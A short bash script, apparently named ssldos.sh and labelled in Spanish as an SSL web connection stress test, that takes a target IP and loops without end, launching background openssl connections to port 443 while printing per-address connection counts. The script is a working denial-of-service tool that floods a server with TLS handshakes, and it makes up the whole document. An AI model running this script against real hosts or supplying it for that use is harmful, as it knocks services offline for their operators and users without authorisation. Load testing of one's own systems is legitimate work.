#!/bin/bash
echo 
echo "Test de estres conexiones web SSL"
echo "Uso.: sh ssldos.sh IP_host"
echo 
while true;do 
	netstat -plan|grep :443 |awk {'print $5'} | cut -d: -f 1 | sort | uniq -c
	openssl s_client -connect $1:443 2>/dev/null 1>/dev/null&done
